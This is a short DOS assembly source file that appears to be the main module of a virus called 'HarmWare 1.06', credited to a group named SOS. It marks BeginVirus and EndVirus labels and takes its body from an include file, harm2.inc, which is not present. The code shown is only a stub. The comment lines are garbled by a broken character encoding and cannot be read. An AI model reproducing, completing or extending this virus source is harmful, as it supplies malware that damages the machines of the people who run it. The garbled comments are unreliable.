;
;	HarmWare 1.06 by Ak Kort [SOS group]
;
;	��� �������樨 ����� �ᯮ���� MAKE.BAT
;
;	����ᠭ �� Microsoft Assembler 6.0
;
;	�� �������ਨ � �⤥���� ������
;
	page 56,255
	.model tiny
	.code
	.startup
	org 100h
BeginVirus:
	mov es,sp
	xor cx,cx
	cli
	include harm2.inc
	
EndVirus:
end